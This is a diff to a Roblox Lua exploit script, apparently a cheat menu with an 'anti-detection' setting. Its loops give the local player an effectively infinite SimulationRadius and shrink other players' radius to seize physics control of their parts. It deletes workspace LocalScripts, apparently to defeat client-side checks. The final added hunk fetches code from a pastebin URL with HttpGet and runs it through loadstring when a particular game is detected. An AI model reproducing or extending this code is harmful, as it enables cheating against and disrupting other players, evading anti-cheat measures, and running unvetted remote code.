@@ -21,7 +21,6 @@ local NetworkAccess = coroutine.create(function()
     spawn(function()
     while true do
     game:GetService("RunService").Stepped:wait()
-    game:GetService("RunService").Heartbeat:wait()
     settings().Physics.AllowSleep = false
     game:GetService("Players").LocalPlayer.MaximumSimulationRadius = INFIN
     game:GetService("Players").LocalPlayer.SimulationRadius = INFIN
@@ -41,7 +40,6 @@ for _, iinstance in pairs(game.Players:GetPlayers()) do
             iinstance.SimulationRadius = Min
             settings().Physics.AllowSleep = false
             game:GetService("RunService").Stepped:wait()
-            game:GetService("RunService").Heartbeat:wait()
             end
         end)
     end
@@ -65,9 +63,9 @@ end)
 --            /\ Part Made by TomQ
 
 -- Version: 3.2 (Note To Self:REMEMBER TO CHANGE UPDATE LOG!)
-local VersionNumberV = "1.78"
-local ChangeLine1 = "*Made Anti-Detection Into A Setting"
-local ChangeLine2 = "*Made Script Run Bit Smoother"
+local VersionNumberV = "1.8"
+local ChangeLine1 = "*Added JailBreak Scripts Will Add More"
+local ChangeLine2 = "*More Game Scripts Soon"
 local ChangeLine3 = ""
 local ChangeLine4 = ""
 -- Instances:
@@ -211,7 +209,6 @@ local pll = game:GetService("Players").LocalPlayer
 
 spawn(function()
 while true do
-game:GetService("RunService").Heartbeat:wait()
 game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
 game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
 game:GetService("RunService").Stepped:wait()
@@ -234,8 +231,6 @@ local function Oof(iinstance)
             while true do
             iinstance.MaximumSimulationRadius = Min
             iinstance.SimulationRadius = Min
-            game:GetService("RunService").Stepped:wait()
-            game:GetService("RunService").Heartbeat:wait()
             end
             end)
         end
@@ -403,7 +398,6 @@ game:GetService("Players").LocalPlayer.Character.Head:Destroy()
 game.workspace.FilteringEnabled = false
 settings().Physics.AllowSleep = false
 game:GetService("RunService").Stepped:wait()
-game:GetService("RunService").Heartbeat:wait()
 for _, instance in pairs(game:GetService("Workspace"):GetDescendants()) do
 	if instance:IsA("LocalScript") then
         instance:Destroy()
@@ -2992,3 +2986,10 @@ Duration = 0.5;
 wait (0.8)
 wait ""
 print "Finished Loading!"
+print "Checking Game"
+if game.PlaceId == 606849621 then
+    loadstring(game:HttpGet("https://pastebin.com/raw/keJsQVjE"))()
+    else
+    warn "Nay"
+end
+print "Finnished"
